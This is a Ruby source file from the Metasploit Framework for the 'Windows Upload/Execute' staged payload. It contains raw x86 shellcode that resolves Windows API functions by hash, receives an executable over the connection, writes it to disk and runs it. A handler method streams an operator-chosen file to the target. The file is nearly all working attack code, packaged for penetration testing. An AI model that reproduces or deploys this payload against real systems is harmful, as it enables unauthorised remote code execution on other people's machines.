##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Windows
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Windows Upload/Execute',
			'Version'       => '$Revision$',
			'Description'   => 'Uploads an executable and runs it (staged)',
			'Author'        => ['vlad902', 'sf' ],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
			'Session'       => Msf::Sessions::CommandShellWindows,
			'PayloadCompat' =>
				{
					'Convention' => 'sockedi -https'
				},
			'Stage'         =>
				{
					'Offsets' =>
						{
							'EXITFUNC' => [ 368, 'V' ]
						},
					'Payload' =>
						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
						"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
						"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
						"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
						"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
						"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
						"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
						"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
						"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
						"\x6A\x7F\x58\xC1\xE0\x03\x29\xC4\x54\x50\x68\x30\xF3\x49\xE4\xFF" +
						"\xD5\x8D\x04\x04\xC7\x00\x73\x76\x63\x2E\xC7\x40\x04\x65\x78\x65" +
						"\x00\x89\xE0\x50\x6A\x00\x6A\x06\x6A\x02\x6A\x00\x6A\x07\x68\x00" +
						"\x00\x00\xE0\x50\x68\xDA\xF6\xDA\x4F\xFF\xD5\x89\xC3\x54\x89\xE6" +
						"\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A" +
						"\x04\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5" +
						"\x53\x53\x89\xE1\x6A\x00\x51\x56\x50\x53\x89\xC3\x6A\x00\x56\x53" +
						"\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC" +
						"\x68\x2D\x57\xAE\x5B\xFF\xD5\x59\x68\xC6\x96\x87\x52\xFF\xD5\x57" +
						"\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01" +
						"\x01\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E" +
						"\x56\x56\xFF\x74\x24\x78\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0" +
						"\x4E\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\x57\x68\x75\x6E" +
						"\x4D\x61\xFF\xD5\xFF\x74\x24\x58\x68\xD7\x2E\xDD\x13\xFF\xD5\xBB" +
						"\xE0\x1D\x2A\x0A\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80" +
						"\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5"
				}
			))

		register_options(
			[
				OptPath.new('PEXEC', [ true, "Full path to the file to upload and execute" ])
			], self.class)
	end

	#
	# Uploads and executes the file
	#
	def handle_connection_stage(conn, opts={})
		begin
			# bug fix for: data = ::IO.read(datastore['PEXEC'])
			# the above does not return the entire contents
			data = ""
			File.open( datastore['PEXEC'], "rb" ) { |f|
				data += f.read
			}
		rescue
			print_error("Failed to read executable: #{$!}")

			# TODO: exception
			conn.close
			return
		end

		print_status("Uploading executable (#{data.length} bytes)...")

		conn.put([ data.length ].pack('V'))
		conn.put(data)

		print_status("Executing uploaded file...")

		super
	end

end
